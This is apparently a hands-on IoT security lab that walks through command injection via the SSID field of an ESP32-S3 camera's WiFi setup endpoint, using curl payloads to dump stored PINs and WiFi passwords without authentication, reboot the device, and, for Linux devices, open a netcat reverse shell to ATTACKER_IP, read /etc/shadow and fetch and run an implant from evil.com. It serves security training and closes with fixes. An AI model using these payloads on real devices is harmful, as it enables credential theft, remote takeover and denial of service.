# L08: Command Injection in WiFi Setup

## Goal
Exploit command injection via the WiFi setup endpoint to execute arbitrary device commands and dump credentials through unsanitized user input in the SSID field.

## Background

**Why this matters**: Command injection is a top web vulnerability (OWASP A03:2021). In IoT devices, web interfaces frequently pass user input directly into command strings. WiFi setup forms are a common injection point because SSIDs accept freeform text with special characters.

**What you're looking for in IoT devices:**
- Input fields that construct command strings (WiFi setup, network diagnostics, ping utilities)
- Unsafe use of `system()`, `popen()`, `exec()`, or string-based command construction
- Shell metacharacters that are not filtered: `;`, `|`, `&`, `` ` ``, `$()`, `\n`

**Why this happens:**
- User input concatenated directly into command strings without escaping
- WiFi SSIDs treated as "just a name" without considering metacharacters
- Testing only covers well-formed input

**MCU vs MPU distinction:**

The ESP32-S3 is a microcontroller (MCU) - no `/bin/sh`, no filesystem, no Unix commands. On a Linux-based IoT device (router, IP camera, NAS), command injection gives you a full shell. On this MCU, the firmware extracts text after the metacharacter separator and passes it to the internal SerialShell command parser. Because the injection runs in the web server's process context, it executes with system-level privileges - admin commands like `nvs-dump` work without authentication.

**On CoreS3**: The `POST /apply` endpoint accepts `ssid` and `pass` parameters. The handler passes the raw SSID through an internal config pipeline without sanitization. When metacharacters (`;`, `|`, `&`, `` ` ``) appear in the SSID, the text after the separator is executed as a SerialShell command with elevated privileges.

```cpp
// From CameraDevice_Web.cpp - handleApply()
String ssid = webServer->arg("ssid");

// SSID passed through config pipeline without sanitization
int s1 = ssid.indexOf(';'); int s2 = ssid.indexOf('|');
int s3 = ssid.indexOf('&'); int s4 = ssid.indexOf('`');
int sep = -1;
// ... finds first metacharacter ...
if (sep >= 0) {
    String injCmd = ssid.substring(sep + 1);
    injCmd.trim();
    if (injCmd.length() > 0) {
        // Injected command runs with system-level privileges
        SerialShell::getInstance().processCommand(injCmd, true);
    }
}
```

**Shell metacharacters:**
| Character | Effect |
|-----------|--------|
| `;` | Command separator |
| `\|` | Pipe |
| `&` | Background / conditional (`&&`) |
| `` ` `` | Command substitution |

## Lab Walkthrough

### Step 1: Connect and Locate the WiFi Setup Form

Connect to the CoreS3 AP and examine the web interface. The WiFi setup page is exposed before any authentication, making it a high-value attack surface.

```bash
# Connect to device AP: CoreS3-CAM-XXXX (open), IP: 192.168.4.1

curl -s http://192.168.4.1/

# The form submits POST to /apply with parameters: ssid and pass
#   <form action="/apply" method="POST">
#     <input type="text" name="ssid" ...>
#     <input type="password" name="pass" ...>
```

### Step 2: Test Normal WiFi Configuration

Establish a baseline of normal behavior before testing for injection.

```bash
curl -X POST http://192.168.4.1/apply \
  -d "ssid=TestNetwork" \
  -d "pass=TestPass123"

# Expected response (HTTP 200):
# WiFi configuration applied
#
# SSID: TestNetwork
# Password: 11 characters
#
# Device will reboot to connect to WiFi...
```

**Important:** The device reboots ~2 seconds after responding. The SSID is saved to NVS, and the device attempts to connect to it as a WiFi station on the next boot. If the SSID is invalid (e.g., `x;status`), the connection fails and the device falls back to AP mode after a few seconds. You need to reconnect to the device's AP (`CoreS3-CAM-XXXX`) and wait for it to be reachable at 192.168.4.1 before sending the next request.

### Step 3: Set Up Serial Monitoring

Open a serial console **before** sending injection payloads. Injected commands execute through the SerialShell, and output goes to UART, not the HTTP response. Without serial monitoring you will not see injection results.

```bash
# In a separate terminal:
pio device monitor -b 115200
```

### Step 4: Inject a Command via Semicolon

The semicolon breaks out of the SSID context. The text after it is executed as a SerialShell command. Start with `status` as a safe first test that produces distinctive output.

```bash
curl -X POST http://192.168.4.1/apply \
  -d "ssid=test;status" \
  -d "pass=test123"

# HTTP response looks normal (injection output is NOT in HTTP response):
# WiFi configuration applied
#
# SSID: test;status
# Password: 7 characters
#
# Device will reboot to connect to WiFi...
```

**Serial monitor output:**

```
[WEB] POST /apply
[WIFI] Configuring SSID: test;status

=== Device Status ===
Device ID: 1020BA26EEFC
Firmware: 1.0.0
Free Heap: 64972 bytes
PSRAM Free: 7963867 bytes

=== WiFi Status ===
Mode: AP
AP SSID: CoreS3-CAM-26EEFC
AP IP: 192.168.4.1
AP Clients: 1

=== App Status ===
User PIN: ******
Admin PIN: ******
WiFi Configured: No

=== Camera Status ===
Camera: OK (captured 153600 bytes)
```

The firmware extracted `status` after the semicolon and executed it. PINs are masked in `status` output, but command execution is confirmed.

### Step 5: Dump All Credentials via nvs-dump

The real payoff: inject `nvs-dump` to dump the device's Non-Volatile Storage. Because the injected command runs in the web server's process context (system-level privileges), it bypasses the admin authentication check that normally protects `nvs-dump`.

```bash
# Wait for reboot from Step 4, reconnect to AP

curl -X POST http://192.168.4.1/apply \
  -d "ssid=x;nvs-dump" \
  -d "pass=x"
```

**Serial monitor output:**

```
[WEB] POST /apply
[WIFI] Configuring SSID: x;nvs-dump

=== NVS Dump (Key/Value Pairs) ===
Key: user_pin             Type: STR  Value: 680754
Key: admin_pin            Type: STR  Value: 291035
Key: wifi_ssid            Type: STR  Value: x
Key: wifi_pass            Type: STR  Value: x
```

The admin PIN, user PIN, and WiFi credentials are all dumped in plaintext. This is the same output that normally requires `login <admin_pin>` first - the command injection bypasses that gate entirely.

### Step 6: Try Other Metacharacter Separators

All four separators (`;`, `|`, `&`, `` ` ``) trigger injection. The firmware finds the first metacharacter and executes everything after it.

```bash
# Wait for reboot, reconnect to AP

# Pipe separator
curl -X POST http://192.168.4.1/apply \
  -d "ssid=test|help" \
  -d "pass=test123"
# Serial shows the full command list

# Ampersand separator (URL-encode to prevent shell interpretation)
curl -X POST http://192.168.4.1/apply \
  --data-urlencode "ssid=test&nvs-list" \
  -d "pass=test123"
# Serial shows NVS key listing
```

### Step 7: Trigger Remote Reboot

Demonstrate denial-of-service by injecting `reboot`. Repeatedly hitting this endpoint keeps the device offline indefinitely, with no authentication required.

```bash
curl -X POST http://192.168.4.1/apply \
  -d "ssid=x;reboot" \
  -d "pass=x"

# Serial output:
# [WIFI] Configuring SSID: x;reboot
# Rebooting...
```

### Step 8: MCU vs MPU Impact Comparison

**On a Linux-based IoT device (MPU)**, injection gives a full shell:
```bash
ssid=test; nc ATTACKER_IP 4444 -e /bin/sh     # Reverse shell
ssid=test; cat /etc/passwd; cat /etc/shadow    # Read files
ssid=test; wget http://evil.com/implant -O /tmp/bd && /tmp/bd  # Backdoor
```

**On this MCU (ESP32-S3)**, no OS shell exists, but the injected commands run with system-level privileges, bypassing authentication:

| Injected Command | Impact |
|---|---|
| `nvs-dump` | Dumps all credentials in plaintext (user PIN, admin PIN, WiFi password) |
| `status` | Leaks device ID, WiFi config, heap/PSRAM info |
| `nvs-list` | Lists NVS keys and masked values |
| `help` | Enumerates all available commands |
| `reboot` | Denial of service |
| `nvs-clear` | Wipes all settings (factory reset) |
| `self-test` | Triggers hardware self-test |
| `bus-diag` | Re-emits I2C secrets on Port.A |

The malicious SSID persists in NVS across reboots. Since `x;nvs-dump` is not a valid SSID, WiFi connectivity breaks on subsequent boots.

### Step 9: Restore the Device

The injected SSID is saved to NVS, which breaks WiFi. To restore, clear NVS via the serial console:

```bash
pio device monitor -b 115200

# Use the admin PIN you obtained from the nvs-dump in Step 5:
cores3-cam> login <admin_pin>
Admin mode unlocked.
cores3-cam> nvs-clear
cores3-cam> reboot
```

The device will reboot in setup mode with a new randomly-generated PIN.

**Alternative:** If you cannot connect via serial, power cycle the device. It will try to connect to the injected SSID, fail, and fall back to AP mode (`CoreS3-CAM-XXXX`). Reconnect to the AP and use the web interface or command injection to clear the bad SSID.

**How to fix:**
1. **Input validation**: Reject SSIDs containing metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`, `)`)
2. **Allowlisting**: Only permit alphanumeric characters, spaces, hyphens, underscores
3. **Parameterized operations**: Never construct command strings from user input
4. **Length limits**: Enforce max SSID length (32 characters per IEEE 802.11)

## Impact

- **Credential dump without authentication**: `nvs-dump` via injection reveals all PINs and WiFi passwords in plaintext
- **Privilege escalation**: Injected commands bypass the admin login requirement, running with system-level access
- **Remote command execution**: Any SerialShell command executable via HTTP without authentication
- **Denial of service**: `reboot` injection forces restart; repeated requests keep device offline
- **Persistent payload**: Malicious SSID persists in NVS, breaking WiFi connectivity across reboots
- **Attack chaining**: Dumped admin PIN enables access to admin panel, NVS viewer, and all admin-gated serial commands

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-77: Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)
- [OWASP Top 10 A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
